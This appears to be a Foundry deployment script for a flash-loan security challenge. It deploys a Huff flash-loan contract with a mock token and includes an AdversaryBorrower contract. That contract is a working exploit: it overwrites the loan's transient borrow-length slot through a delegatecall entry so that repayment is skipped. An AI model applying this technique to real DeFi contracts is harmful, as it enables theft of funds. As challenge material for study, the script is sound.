pragma solidity ^0.8.17;

import { Script } from "forge-std/Script.sol";
import { Token } from "../src/Token.sol";
import { ITransientLoan } from "../src/interfaces/ITransientLoan.sol";
import { IFlashLoanReceiver } from "../src/interfaces/IFlashLoanReceiver.sol";

contract Deployer is Script {
    function run() external {
        vm.startBroadcast();

        // Deploy mock token
        Token mockToken = new Token("MOCK", "MCK", 18);

        string[] memory cmds = new string[](6);
        cmds[0] = "huffc";
        cmds[1] = "./src/TransientLoanLive.huff";
        cmds[2] = "-b";
        cmds[3] = "-c";
        cmds[4] = string(abi.encodePacked("TOKEN=", bytesToString(abi.encodePacked(mockToken))));
        cmds[5] = string(abi.encodePacked("END=", bytesToString(abi.encodePacked(uint32(block.timestamp + 1 weeks)))));
        bytes memory code = vm.ffi(cmds);

        ITransientLoan flashLoaner;
        assembly {
            flashLoaner := create(0x00, add(code, 0x20), mload(code))
        }

        // Mint max uint tokens to the [TransientLoan] contract.
        mockToken.mint(address(flashLoaner), type(uint256).max);

        // new AdversaryBorrower(flashLoaner, mockToken);
        // new HonestBorrower(flashLoaner, mockToken);

        vm.stopBroadcast();
    }

    function bytesToString(bytes memory data) public pure returns (string memory) {
        bytes memory alphabet = "0123456789abcdef";

        bytes memory str = new bytes(2 + data.length * 2);
        str[0] = "0";
        str[1] = "x";
        for (uint256 i = 0; i < data.length; i++) {
            str[2 + i * 2] = alphabet[uint256(uint8(data[i] >> 4))];
            str[3 + i * 2] = alphabet[uint256(uint8(data[i] & 0x0f))];
        }
        return string(str);
    }
}

contract AdversaryBorrower is IFlashLoanReceiver {
    /// @notice The transient loan contract
    ITransientLoan flashLoaner;
    /// @notice The mock erc20 that will be borrowed
    Token mockToken;

    constructor(ITransientLoan _flashLoaner, Token _mockToken) {
        flashLoaner = _flashLoaner;
        mockToken = _mockToken;
    }

    /// @notice Initiate the exploit
    function exploit() external {
        flashLoaner.startLoan();
    }

    function submit() external {
        mockToken.approve(address(flashLoaner), 10);
        flashLoaner.submit();
    }

    ////////////////////////////////////////////////////////////////
    //                  IFlashLoanReceiver impl                   //
    ////////////////////////////////////////////////////////////////

    /// @notice `IFlashLoanReceiver` implementation
    function bankroll() external {
        // Borrow some of the mock token
        (bool success,) = address(flashLoaner).call(
            abi.encodePacked(bytes4(flashLoaner.borrow.selector), address(mockToken), uint256(10), address(this))
        );

        // Deploy contract to overwrite borrow length storage slot
        // PUSH1 0
        // PUSH1 block.timestamp
        // TSTORE
        bytes memory code =
            bytes.concat(hex"60088060093d393df3600063", abi.encodePacked(uint32(block.timestamp)), hex"b4");
        address _exploit;
        assembly {
            _exploit := create(0x00, add(code, 0x20), mload(code))
        }

        // Call the flash loaner contract's delegatecall logic with our exploit contract
        // to overwrite the borrows array length slot and skip the debt collection loop.
        // Should succeed.
        bytes32 param;
        assembly {
            // Store this contract's address in memory @ 0x00
            mstore(0x00, address())
            // Assign our param's value
            param := or(shl(0x60, _exploit), and(keccak256(0x00, 0x20), 0xFFFFFFFF))
        }
        (success,) = address(flashLoaner).call(abi.encodeWithSelector(flashLoaner.atlas.selector, param));
    }
}

contract HonestBorrower is IFlashLoanReceiver {
    /// @notice The transient loan contract
    ITransientLoan flashLoaner;
    /// @notice The mock erc20 that will be borrowed
    Token mockToken;

    constructor(ITransientLoan _flashLoaner, Token _mockToken) {
        flashLoaner = _flashLoaner;
        mockToken = _mockToken;
    }

    /// @notice Initiate the honest loan
    function borrow() external {
        flashLoaner.startLoan();
    }

    ////////////////////////////////////////////////////////////////
    //                  IFlashLoanReceiver impl                   //
    ////////////////////////////////////////////////////////////////

    /// @notice `IFlashLoanReceiver` implementation
    function bankroll() external {
        // Borrow some of the mock token
        (bool success,) = address(flashLoaner).call(
            abi.encodePacked(bytes4(flashLoaner.borrow.selector), address(mockToken), uint256(10), address(this))
        );

        // Don't repay
    }
}
